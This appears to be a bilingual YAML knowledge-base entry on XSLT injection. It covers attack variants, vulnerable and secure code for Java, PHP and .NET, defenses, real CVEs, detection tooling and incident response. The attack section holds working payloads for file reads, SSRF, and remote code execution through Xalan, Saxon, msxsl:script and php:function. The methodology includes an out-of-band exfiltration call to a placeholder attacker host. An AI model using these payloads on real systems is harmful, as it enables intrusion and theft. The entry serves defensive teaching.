@@ -1,0 +1,399 @@
+meta:
+  id: xsltinjection
+  threatId: cat_1_research02
+  severity: Critical
+  color: '#be123c'
+  colorRgb: 190,18,60
+  cwe: CWE-91
+  cvss: '9.8'
+  standard: OWASP A03:2021
+hero:
+  titleMain: 'XSLT '
+  titleGrad: Injection
+  titleTail: ''
+  topbar: XSLT Injection (XSL Injection)
+  lead:
+    en: The "SSTI of the XML world." XXE tops out at file read, SSRF, and DoS; XSLT is a full transformation language with vendor-specific extension mechanisms that reach directly into the host runtime, so the same attacker control that gives XXE its ceiling gives XSLT injection a floor of RCE. Xalan's http://xml.apache.org/xalan/java/java.lang.Runtime namespace binds a stylesheet prefix directly to the JVM's Runtime class -- rt:getRuntime() and rt:exec(...) call the real methods, no gadget chain required. PHP's registerPHPFunctions() and .NET's msxsl:script are the equivalent escape hatches for their runtimes.
+    pl: '"SSTI świata XML." XXE osiąga sufit przy odczycie pliku, SSRF i DoS; XSLT to pełny język transformacji z mechanizmami rozszerzeń specyficznymi dla dostawcy które sięgają bezpośrednio do runtime hosta, więc ta sama kontrola atakującego która daje XXE jego sufit, daje wstrzyknięciu XSLT podłogę w postaci RCE. Przestrzeń nazw Xalana http://xml.apache.org/xalan/java/java.lang.Runtime wiąże prefiks arkusza stylów bezpośrednio z klasą Runtime JVM -- rt:getRuntime() i rt:exec(...) wywołują prawdziwe metody, bez potrzeby łańcucha gadżetów. registerPHPFunctions() PHP i msxsl:script .NET to równoważne furtki ucieczki dla ich runtime.'
+  metrics:
+  - k: CWE-91
+    v:
+      en: Weakness ID (shared with generic XML Injection)
+      pl: ID słabości (dzielone z generycznym XML Injection)
+  - k: '9.8'
+    v: CVSS · Critical (CVE-2023-49093)
+  - k: A03:2021
+    v: OWASP Top 10
+  - k: '6'
+    v:
+      en: Attack variants
+      pl: Warianty ataku
+  sources:
+  - label: CWE-91 (MITRE)
+    url: https://cwe.mitre.org/data/definitions/91.html
+  - label: PayloadsAllTheThings — XSLT Injection
+    url: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection
+  - label: GHSA — CVE-2023-49093 (HtmlUnit)
+    url: https://github.com/advisories/GHSA-37vq-hr2f-g7h7
+  - label: GHSA — CVE-2024-36522 (Apache Wicket)
+    url: https://github.com/advisories/GHSA-hhwc-gh8h-9rrp
+sectionOrder:
+- overview
+- types
+- code
+- method
+- defense
+- incidents
+- tools
+- compliance
+- ir
+- sources
+nav:
+- id: overview
+  en: Overview
+  pl: Przegląd
+- id: types
+  en: Attack types
+  pl: Typy ataków
+- id: code
+  en: Vuln vs Secure
+  pl: Podatny vs Bezpieczny
+- id: method
+  en: Methodology
+  pl: Metodyka
+- id: defense
+  en: Defense layers
+  pl: Warstwy obrony
+- id: incidents
+  en: Real incidents
+  pl: Incydenty
+- id: tools
+  en: SAST / DAST
+  pl: SAST / DAST
+- id: compliance
+  en: Compliance
+  pl: Zgodność
+- id: ir
+  en: Incident response
+  pl: Reagowanie
+- id: sources
+  en: Sources
+  pl: Źródła
+sections:
+  attacks:
+    title:
+      en: Attack types
+      pl: Typy ataków
+    lead:
+      en: Six variants, escalating by processor. All three research teams independently verified the exact Xalan payload syntax below byte-for-byte against PayloadsAllTheThings -- nothing here was guessed.
+      pl: Sześć wariantów, eskalujących wg procesora. Wszystkie trzy zespoły badawcze niezależnie zweryfikowały dokładną składnię ładunku Xalan poniżej bajt-po-bajcie względem PayloadsAllTheThings -- nic tu nie zostało zgadnięte.
+    items:
+    - name: Local file disclosure via document()
+      sev: high
+      description:
+        en: The XSLT document() function fetches and parses a file or URL. Non-XML targets like /etc/passwd often error out under XSLT 1.0 parsers, but the parse error commonly leaks the first line; XSLT 2.0's unparsed-text() (Saxon) reads arbitrary text cleanly instead.
+        pl: Funkcja document() XSLT pobiera i parsuje plik lub URL. Cele nie-XML jak /etc/passwd często dają błąd pod parserami XSLT 1.0, ale błąd parsowania powszechnie wycieka pierwszą linię; unparsed-text() XSLT 2.0 (Saxon) czyta zamiast tego dowolny tekst czysto.
+      payload: <xsl:copy-of select="document('/etc/passwd')"/>
+    - name: SSRF / internal port scan via document()
+      sev: high
+      description:
+        en: The same function fetches internal URLs; differential errors/timing across attempted ports reveal open services, the same way a classic SSRF-driven port scan does.
+        pl: Ta sama funkcja pobiera wewnętrzne URL-e; różnicowe błędy/czas przy próbowanych portach ujawniają otwarte usługi, tak samo jak klasyczne skanowanie portów napędzane SSRF.
+      payload: <xsl:copy-of select="document('http://172.16.132.1:25')"/>
+    - name: RCE via Xalan Java extension (the flagship variant)
+      sev: critical
+      description:
+        en: Xalan maps the namespace http://xml.apache.org/xalan/java/<fully.qualified.ClassName> directly to a live Java class. Binding a prefix to java.lang.Runtime gives the stylesheet rt:getRuntime() and rt:exec(...) as real, callable JVM methods -- no gadget chain, no deserialization, just a namespace declaration.
+        pl: Xalan mapuje przestrzeń nazw http://xml.apache.org/xalan/java/<fully.qualified.ClassName> bezpośrednio do żywej klasy Java. Związanie prefiksu z java.lang.Runtime daje arkuszowi stylów rt:getRuntime() i rt:exec(...) jako prawdziwe, wywoływalne metody JVM -- bez łańcucha gadżetów, bez deserializacji, tylko deklaracja przestrzeni nazw.
+      payload: xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" ... <xsl:variable name="r" select="rt:getRuntime()"/><xsl:variable name="p" select="rt:exec($r,'ls')"/>
+    - name: RCE via Saxon reflexive Java extension
+      sev: critical
+      description:
+        en: 'Saxon''s java: namespace scheme achieves the same reflexive class-binding as Xalan for XSLT 2.0/3.0 stylesheets, when reflexive extension functions are enabled -- Saxon-HE disables them by default, Saxon-PE/EE historically allowed them, making this itself a useful fingerprinting signal.'
+        pl: 'Schemat przestrzeni nazw java: Saxona osiąga to samo refleksyjne wiązanie klasy co Xalan dla arkuszy stylów XSLT 2.0/3.0, gdy refleksyjne funkcje rozszerzeń są włączone -- Saxon-HE wyłącza je domyślnie, Saxon-PE/EE historycznie na nie pozwalał, co samo w sobie jest przydatnym sygnałem rozpoznania.'
+      payload: <xsl:value-of select="Runtime:exec(Runtime:getRuntime(),'cmd.exe /C ping IP')" xmlns:Runtime="java:java.lang.Runtime"/>
+    - name: RCE via .NET msxsl:script
+      sev: critical
+      description:
+        en: An embedded <msxsl:script> block runs inline C#/VB compiled at transform time. Disabled by default in XslCompiledTransform (requires XsltSettings.EnableScript or the combined XsltSettings.TrustedXslt), but a common misconfiguration when developers reach for TrustedXslt to also enable document().
+        pl: Osadzony blok <msxsl:script> uruchamia inline C#/VB kompilowany w czasie transformacji. Wyłączone domyślnie w XslCompiledTransform (wymaga XsltSettings.EnableScript albo połączonego XsltSettings.TrustedXslt), ale częsta błędna konfiguracja gdy developerzy sięgają po TrustedXslt by też włączyć document().
+      payload: <msxsl:script language="C#" implements-prefix="user"><![CDATA[ public string exec(){ System.Diagnostics.Process.Start("cmd.exe"); return "ok"; } ]]></msxsl:script>
+    - name: RCE via PHP registerPHPFunctions()
+      sev: critical
+      description:
+        en: When the application calls XSLTProcessor::registerPHPFunctions() with no allowlist, a stylesheet using the http://php.net/xsl namespace can call php:function() to invoke any PHP function by name -- readfile, passthru, system -- turning an XSLT transform into direct RCE.
+        pl: Gdy aplikacja wywołuje XSLTProcessor::registerPHPFunctions() bez allowlisty, arkusz stylów używający przestrzeni nazw http://php.net/xsl może wywołać php:function() by wywołać dowolną funkcję PHP po nazwie -- readfile, passthru, system -- zamieniając transformację XSLT w bezpośrednie RCE.
+      payload: xmlns:php="http://php.net/xsl" ... <xsl:value-of select="php:function('passthru','id')"/>
+  code:
+    title:
+      en: Vulnerable vs Secure
+      pl: Podatny vs Bezpieczny
+    lead:
+      en: 'Every processor ships a secure-processing switch that disables extension functions and restricts document(). The fix is always the same: flip it on, and never load a user-supplied stylesheet with it off.'
+      pl: 'Każdy procesor ma przełącznik bezpiecznego przetwarzania który wyłącza funkcje rozszerzeń i ogranicza document(). Naprawa jest zawsze taka sama: włącz go, i nigdy nie ładuj dostarczonego przez użytkownika arkusza stylów z wyłączonym.'
+    languages:
+    - label: Java
+      lang: java
+      vulnerable: '// VULNERABLE -- extension functions and document() usable by default
+
+        TransformerFactory tf = TransformerFactory.newInstance();
+
+        Transformer t = tf.newTransformer(new StreamSource(userStylesheet));'
+      safe: '// SECURE -- disables extension functions and restricts external access
+
+        TransformerFactory tf = TransformerFactory.newInstance();
+
+        tf.setFeature(javax.xml.XMLConstants.FEATURE_SECURE_PROCESSING, true);
+
+        tf.setAttribute("http://www.oracle.com/xml/jaxp/properties/enableExtensionFunctions", false);
+
+        tf.setAttribute(javax.xml.XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
+
+        tf.setAttribute(javax.xml.XMLConstants.ACCESS_EXTERNAL_DTD, "");
+
+        // Best: never accept userStylesheet at all -- use a fixed, server-owned one'
+    - label: PHP
+      lang: php
+      vulnerable: '// VULNERABLE
+
+        $proc = new XSLTProcessor();
+
+        $proc->registerPHPFunctions();
+
+        $proc->importStylesheet($userXsl);'
+      safe: '// SECURE -- never register PHP functions for untrusted XSL
+
+        $proc = new XSLTProcessor();
+
+        $proc->setSecurityPrefs(XSL_SECPREF_DEFAULT); // blocks file read/write/create/network
+
+        $proc->importStylesheet($trustedServerXsl);
+
+        // (do not call registerPHPFunctions() at all)'
+    - label: C# / .NET
+      lang: csharp
+      vulnerable: '// VULNERABLE -- TrustedXslt enables BOTH script and document()
+
+        var xslt = new XslCompiledTransform();
+
+        xslt.Load(userStylesheet, XsltSettings.TrustedXslt, new XmlUrlResolver());'
+      safe: '// SECURE -- defaults disable script and document(); null resolver blocks external fetch
+
+        var xslt = new XslCompiledTransform();
+
+        xslt.Load(trustedStylesheet, XsltSettings.Default, null);'
+  method:
+    title:
+      en: Attack methodology
+      pl: Metodyka ataku
+    lead:
+      en: 'Vendor fingerprinting matters more here than in most injection classes: each processor exposes a completely different extension namespace, so the escalation payload only works once you know which engine you are talking to.'
+      pl: 'Rozpoznanie dostawcy ma tu większe znaczenie niż w większości klas wstrzyknięć: każdy procesor udostępnia zupełnie inną przestrzeń nazw rozszerzeń, więc ładunek eskalacji działa tylko gdy wiesz z jakim silnikiem rozmawiasz.'
+    steps:
+    - title:
+        en: Identify an XSLT-processing endpoint
+        pl: Zidentyfikuj endpoint przetwarzający XSLT
+      description:
+        en: Look for parameters/uploads named xsl/xslt/stylesheet/transform, or features labeled "export", "report skin", or "test transformation". Processor-specific stack traces (javax.xml.transform.*, net.sf.saxon.*, System.Xml.Xsl.*) in error responses confirm it.
+        pl: Szukaj parametrów/uploadów nazwanych xsl/xslt/stylesheet/transform, albo funkcji oznaczonych "export", "skórka raportu", albo "testuj transformację". Ślady stosu specyficzne dla procesora (javax.xml.transform.*, net.sf.saxon.*, System.Xml.Xsl.*) w odpowiedziach błędów to potwierdzają.
+    - title:
+        en: Confirm live transformation
+        pl: Potwierdź żywą transformację
+      description:
+        en: Submit a benign stylesheet performing arithmetic in xsl:value-of; a computed result rather than literal text confirms the input reaches a real processor.
+        pl: Wyślij niegroźny arkusz stylów wykonujący arytmetykę w xsl:value-of; obliczony wynik zamiast dosłownego tekstu potwierdza że wejście dociera do prawdziwego procesora.
+    - title:
+        en: Fingerprint the vendor
+        pl: Rozpoznaj dostawcę
+      description:
+        en: system-property('xsl:vendor') and system-property('xsl:version') reveal Xalan ("Apache Software Foundation", 1.0), Saxon ("SAXON", 2.0/3.0), libxslt ("libxslt", 1.0), or Microsoft (.NET) -- each requiring a different extension namespace.
+        pl: system-property('xsl:vendor') i system-property('xsl:version') ujawniają Xalan ("Apache Software Foundation", 1.0), Saxon ("SAXON", 2.0/3.0), libxslt ("libxslt", 1.0), albo Microsoft (.NET) -- każdy wymagający innej przestrzeni nazw rozszerzeń.
+    - title:
+        en: Escalate with the vendor-specific extension mechanism
+        pl: Eskaluj mechanizmem rozszerzeń specyficznym dla dostawcy
+      description:
+        en: 'Xalan/Saxon: bind a namespace prefix to java.lang.Runtime and call getRuntime()/exec(). .NET: embed msxsl:script if scripting is enabled. PHP: php:function() if registerPHPFunctions() was called.'
+        pl: 'Xalan/Saxon: zwiąż prefiks przestrzeni nazw z java.lang.Runtime i wywołaj getRuntime()/exec(). .NET: osadź msxsl:script jeśli skrypty są włączone. PHP: php:function() jeśli wywołano registerPHPFunctions().'
+    - title:
+        en: Fall back to blind/out-of-band techniques when output is not reflected
+        pl: Wróć do technik ślepych/out-of-band gdy wyjście nie jest odbite
+      description:
+        en: document('http://attacker-collaborator/') confirms execution and exfiltrates data via an out-of-band callback even when the transform's result never reaches the response.
+        pl: document('http://attacker-collaborator/') potwierdza wykonanie i eksfiltruje dane przez callback out-of-band nawet gdy wynik transformacji nigdy nie dociera do odpowiedzi.
+  defenses:
+    title:
+      en: Defense layers, ranked
+      pl: Warstwy obrony wg skuteczności
+    lead:
+      en: Every processor's own secure-processing flag is the concrete, named control -- but history shows it has not always been reliable on its own (Xalan's own secure-processing bypass, CVE-2014-0107), so pair it with never accepting user stylesheets in the first place.
+      pl: Własna flaga bezpiecznego przetwarzania każdego procesora to konkretna, nazwana kontrola -- ale historia pokazuje że nie zawsze była sama w sobie niezawodna (własne obejście bezpiecznego przetwarzania Xalana, CVE-2014-0107), więc połącz to z nigdy-nie-akceptowaniem arkuszy stylów użytkownika w pierwszej kolejności.
+    items:
+    - rank: 1
+      eff: 99
+      kind: primary
+      label:
+        en: Never accept user-supplied stylesheets or XSLT fragments
+        pl: Nigdy nie akceptuj dostarczonych przez użytkownika arkuszy stylów lub fragmentów XSLT
+      note:
+        en: Map an opaque client-side choice to a server-side allowlist of vetted, server-owned stylesheets. Removes the root cause entirely regardless of processor.
+        pl: Mapuj nieprzezroczysty wybór po stronie klienta na allowlistę po stronie serwera zweryfikowanych, należących do serwera arkuszy stylów. Całkowicie usuwa przyczynę źródłową niezależnie od procesora.
+    - rank: 2
+      eff: 92
+      kind: primary
+      label:
+        en: Disable extension functions/scripting via each processor's secure-processing switch
+        pl: Wyłącz funkcje rozszerzeń/skrypty przez przełącznik bezpiecznego przetwarzania każdego procesora
+      note:
+        en: Java FEATURE_SECURE_PROCESSING=true + enableExtensionFunctions=false; .NET XsltSettings.Default (never TrustedXslt/EnableScript); PHP never call registerPHPFunctions(); Saxon-HE instead of PE/EE where reflexive extensions matter. Removes the RCE ceiling.
+        pl: Java FEATURE_SECURE_PROCESSING=true + enableExtensionFunctions=false; .NET XsltSettings.Default (nigdy TrustedXslt/EnableScript); PHP nigdy nie wywołuj registerPHPFunctions(); Saxon-HE zamiast PE/EE tam gdzie liczą się refleksyjne rozszerzenia. Usuwa sufit RCE.
+    - rank: 3
+      eff: 82
+      kind: strong
+      label:
+        en: Disable or restrict document()/unparsed-text() to a safe base URI
+        pl: Wyłącz lub ogranicz document()/unparsed-text() do bezpiecznego bazowego URI
+      note:
+        en: Java ACCESS_EXTERNAL_STYLESHEET/DTD=""; .NET EnableDocumentFunction=false or a null/secure XmlResolver. Closes file-read and SSRF once extensions are already disabled.
+        pl: Java ACCESS_EXTERNAL_STYLESHEET/DTD=""; .NET EnableDocumentFunction=false albo null/bezpieczny XmlResolver. Zamyka odczyt pliku i SSRF gdy rozszerzenia są już wyłączone.
+    - rank: 4
+      eff: 65
+      kind: mitigation
+      label:
+        en: Sandbox/isolate the transformation process
+        pl: Sandbox/izoluj proces transformacji
+      note:
+        en: Least-privilege process, containerized with no outbound network access, dropped filesystem permissions -- contains residual RCE/SSRF impact if a bypass exists, as Xalan's own CVE-2014-0107 proved secure-processing flags can historically fail.
+        pl: Proces o najmniejszych uprawnieniach, skonteneryzowany bez dostępu do sieci wychodzącej, usunięte uprawnienia systemu plików -- ogranicza pozostały wpływ RCE/SSRF jeśli istnieje obejście, tak jak własne CVE-2014-0107 Xalana udowodniło że flagi bezpiecznego przetwarzania historycznie mogą zawieść.
+    - rank: 5
+      eff: 35
+      kind: weak
+      label:
+        en: Input validation / blacklisting XSLT extension namespaces
+        pl: Walidacja wejścia / blacklista przestrzeni nazw rozszerzeń XSLT
+      note:
+        en: XSLT syntax is too rich and namespace declarations too flexible to reliably filter. Defense-in-depth only, never the primary control.
+        pl: Składnia XSLT jest zbyt bogata a deklaracje przestrzeni nazw zbyt elastyczne by je niezawodnie filtrować. Tylko obrona w głąb, nigdy podstawowa kontrola.
+  incidents:
+    title:
+      en: Real-world incidents
+      pl: Rzeczywiste incydenty
+    lead:
+      en: 'Three real, independently-verified CVEs spanning three different processors and root causes: direct user-stylesheet control, and two clean ''missing FEATURE_SECURE_PROCESSING'' cases in mainstream Java libraries.'
+      pl: 'Trzy realne, niezależnie zweryfikowane CVE obejmujące trzy różne procesory i przyczyny źródłowe: bezpośrednia kontrola arkusza stylów użytkownika, i dwa czyste przypadki "brakującego FEATURE_SECURE_PROCESSING" w głównych bibliotekach Java.'
+    items:
+    - org: OverIT Geocall
+      year: 2022
+      impact: CVE-2022-22834, CVSS 8.8
+      cost: Authenticated RCE via a legitimate application feature
+      description:
+        en: The "Test Trasformazione XSL" feature let an authenticated user upload and run an arbitrary stylesheet -- direct user-stylesheet control, the most common real-world root cause of this class. Disclosed by Yarix; a companion CVE (2022-22835) covers a separate XXE issue in the same product.
+        pl: Funkcja "Test Trasformazione XSL" pozwalała uwierzytelnionemu użytkownikowi wgrać i uruchomić dowolny arkusz stylów -- bezpośrednia kontrola arkusza stylów użytkownika, najczęstsza rzeczywista przyczyna źródłowa tej klasy. Ujawnione przez Yarix; towarzyszące CVE (2022-22835) obejmuje osobny problem XXE w tym samym produkcie.
+    - org: Apache Wicket
+      year: 2024
+      impact: CVE-2024-36522
+      cost: RCE processing untrusted XSLT via XSLTResourceStream
+      description:
+        en: XSLTResourceStream.java did not set FEATURE_SECURE_PROCESSING by default, leaving extension functions reachable when transforming input from an untrusted source. Affected 8.0.0-8.15.0, 9.0.0-9.17.0, 10.0.0-M1-10.0.0; fixed in 8.16.0/9.18.0/10.1.0.
+        pl: XSLTResourceStream.java nie ustawiał domyślnie FEATURE_SECURE_PROCESSING, zostawiając funkcje rozszerzeń osiągalne przy transformacji wejścia z niezaufanego źródła. Dotyczyło 8.0.0-8.15.0, 9.0.0-9.17.0, 10.0.0-M1-10.0.0; naprawione w 8.16.0/9.18.0/10.1.0.
+    - org: HtmlUnit
+      year: 2023
+      impact: CVE-2023-49093, CVSS 9.8
+      cost: RCE simply by browsing an attacker-controlled webpage
+      description:
+        en: 'The exact same root cause as the Wicket incident, in a different popular Java library: XSLProcessor#transform() did not enable FEATURE_SECURE_PROCESSING, so a malicious webpage''s embedded XSLT could achieve RCE against anything using HtmlUnit <3.9.0 to browse it. Fixed in 3.9.0.'
+        pl: 'Dokładnie ta sama przyczyna źródłowa co w incydencie Wicket, w innej popularnej bibliotece Java: XSLProcessor#transform() nie włączał FEATURE_SECURE_PROCESSING, więc osadzony XSLT złośliwej strony mógł osiągnąć RCE przeciw czemukolwiek co używa HtmlUnit <3.9.0 by ją przeglądać. Naprawione w 3.9.0.'
+    inlineSources:
+    - label: Yarix — CVE-2022-22834 (OverIT Geocall)
+      url: https://labs.yarix.com/advisories/cve-2022-22834/
+    - label: GHSA — CVE-2024-36522 (Apache Wicket)
+      url: https://github.com/advisories/GHSA-hhwc-gh8h-9rrp
+    - label: GHSA — CVE-2023-49093 (HtmlUnit)
+      url: https://github.com/advisories/GHSA-37vq-hr2f-g7h7
+  tools:
+    title:
+      en: Detection tooling
+      pl: Narzędzia wykrywania
+    lead:
+      en: OWASP ZAP has a dedicated, named XSLT injection check; Burp Suite notably does not (confirmed absent from its KB issue list by all three research passes) -- a real, current coverage gap worth knowing rather than assuming parity between the two scanners.
+      pl: OWASP ZAP ma dedykowaną, nazwaną kontrolę wstrzyknięcia XSLT; Burp Suite zauważalnie nie ma (potwierdzone jako nieobecne na liście problemów KB przez wszystkie trzy przejścia badawcze) -- realna, aktualna luka pokrycia warta znajomości zamiast zakładania parytetu między dwoma skanerami.
+    sast:
+    - - Semgrep / CodeQL / SpotBugs (find-sec-bugs)
+      - Flag TransformerFactory usage without FEATURE_SECURE_PROCESSING, PHP registerPHPFunctions() calls, and similar processor-misconfiguration patterns
+    - - .NET Roslyn analyzer CA3076
+      - '"Insecure XSLT Script Execution" -- flags XslCompiledTransform.Load using XsltSettings.TrustedXslt combined with a non-null XmlResolver'
+    dast:
+    - - OWASP ZAP
+      - Dedicated active-scan "XSLT Injection" alert (rule 90017) -- injects vendor-fingerprint and transformation probes
+    - - Burp Suite Collaborator
+      - No dedicated XSLT-injection scanner issue exists in Burp's own KB, but Collaborator remains useful for manual out-of-band document() confirmation
+    - - Manual fingerprint + escalation
+      - system-property('xsl:vendor'/'xsl:version') probes followed by the vendor-specific extension payload
+    note:
+      en: <strong>Key signal:</strong> grep for TransformerFactory/XSLTProcessor/XslCompiledTransform instantiation sites and check whether FEATURE_SECURE_PROCESSING, registerPHPFunctions(), or XsltSettings.TrustedXslt appear near them -- exactly the pattern behind both the Wicket and HtmlUnit incidents above.
+      pl: <strong>Kluczowy sygnał:</strong> szukaj miejsc tworzenia instancji TransformerFactory/XSLTProcessor/XslCompiledTransform i sprawdź czy FEATURE_SECURE_PROCESSING, registerPHPFunctions(), albo XsltSettings.TrustedXslt pojawiają się w ich pobliżu -- dokładnie ten wzorzec stoi za incydentami Wicket i HtmlUnit powyżej.
+  compliance:
+    title:
+      en: Compliance quick-reference
+      pl: Szybka zgodność
+    lead:
+      en: 'A clean corrective finding: all three research passes independently checked whether CWE-1336 (the template-engine CWE used elsewhere in this knowledge base for CSTI) applies to XSLT, and all three found it does not -- MITRE''s own enumerated examples for CWE-1336 name Twig, Jinja2, JSP, FreeMarker and others, but never XSLT.'
+      pl: 'Czysta korygująca konkluzja: wszystkie trzy przejścia badawcze niezależnie sprawdziły czy CWE-1336 (CWE silnika szablonów użyte gdzie indziej w tej bazie wiedzy dla CSTI) stosuje się do XSLT, i wszystkie trzy stwierdziły że nie -- własne wymienione przykłady MITRE dla CWE-1336 nazywają Twig, Jinja2, JSP, FreeMarker i inne, ale nigdy XSLT.'
+    items:
+    - std: CWE (MITRE)
+      items:
+      - CWE-91 — XML Injection (aka Blind XPath Injection) -- the same primary CWE as this knowledge base's generic XML Injection deep-dive; XSLT injection is catalogued as a specific sub-case, matching NVD's own CVE-2022-22834 classification
+      - CWE-1336 (Improper Neutralization of Special Elements Used in a Template Engine) does NOT apply, despite XSLT's conceptual similarity to a template engine -- verified directly against MITRE's own enumerated example list, which never names XSLT
+      - CWE-94 (Code Injection) and CWE-95 (Eval Injection) are defensible secondary tags specifically for the RCE-tier variants (Xalan/Saxon/PHP/.NET extensions), since that outcome is genuine code execution, not just markup neutralization failure
+    - std: OWASP
+      items:
+      - A03:2021 — Injection
+    inlineSources:
+    - label: CWE-91 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/91.html
+    - label: CWE-1336 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/1336.html
+    - label: OWASP A03:2021 Injection
+      url: https://owasp.org/Top10/2021/A03_2021-Injection/
+  ir:
+    title:
+      en: Incident response checklist
+      pl: Lista kontrolna reagowania
+    lead:
+      en: If active XSLT injection exploitation is confirmed, work this list top to bottom.
+      pl: Po potwierdzeniu aktywnej eksploatacji wstrzyknięcia XSLT, przejdź tę listę od góry.
+    steps:
+    - en: Treat the host as fully compromised if RCE is confirmed -- rotate all credentials/secrets reachable from that process
+      pl: Traktuj hosta jako w pełni skompromitowanego jeśli RCE jest potwierdzone -- zrotuj wszystkie poświadczenia/sekrety osiągalne z tego procesu
+    - en: Identify the exact processor (Xalan/Saxon/libxslt/.NET) from error messages or the affected component, since each has its own secure-processing flag and fix
+      pl: Zidentyfikuj dokładny procesor (Xalan/Saxon/libxslt/.NET) z komunikatów błędów lub dotkniętego komponentu, bo każdy ma własną flagę bezpiecznego przetwarzania i naprawę
+    - en: Grep the codebase for every TransformerFactory/XSLTProcessor/XslCompiledTransform instantiation, not just the one exploited -- check each for the secure-processing/registerPHPFunctions/TrustedXslt pattern
+      pl: Przeszukaj kod pod kątem każdej instancji TransformerFactory/XSLTProcessor/XslCompiledTransform, nie tylko tej która została wykorzystana -- sprawdź każdą pod kątem wzorca bezpieczne-przetwarzanie/registerPHPFunctions/TrustedXslt
+    - en: Stop accepting user-supplied stylesheets entirely where feasible; otherwise enable the processor's secure-processing flag and patch to the fixed library version
+      pl: Przestań całkowicie akceptować dostarczone przez użytkownika arkusze stylów tam gdzie to wykonalne; w innym przypadku włącz flagę bezpiecznego przetwarzania procesora i zaktualizuj do wersji biblioteki z łatką
+    - en: Check outbound connection logs for unexpected document()-driven fetches to unfamiliar hosts
+      pl: Sprawdź logi połączeń wychodzących pod kątem nieoczekiwanych pobrań napędzanych przez document() do nieznanych hostów
+    - en: Notify per applicable data-breach obligations if data was exfiltrated
+      pl: Powiadom zgodnie z obowiązującymi wymogami dot. naruszenia danych jeśli dane zostały eksfiltrowane
+  sources:
+    title:
+      en: Sources
+      pl: Źródła
+    items:
+    - label: CWE-91 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/91.html
+    - label: CWE-1336 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/1336.html
+    - label: OWASP A03:2021 Injection
+      url: https://owasp.org/Top10/2021/A03_2021-Injection/
+    - label: PayloadsAllTheThings — XSLT Injection
+      url: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection
+    - label: Yarix — CVE-2022-22834 (OverIT Geocall)
+      url: https://labs.yarix.com/advisories/cve-2022-22834/
+    - label: GHSA — CVE-2024-36522 (Apache Wicket)
+      url: https://github.com/advisories/GHSA-hhwc-gh8h-9rrp
+    - label: GHSA — CVE-2023-49093 (HtmlUnit)
+      url: https://github.com/advisories/GHSA-37vq-hr2f-g7h7
+    - label: OWASP ZAP — XSLT Injection alert 90017
+      url: https://www.zaproxy.org/docs/alerts/90017/
+    - label: Microsoft Learn — XSLT Security Considerations
+      url: https://learn.microsoft.com/en-us/dotnet/standard/data/xml/xslt-security-considerations
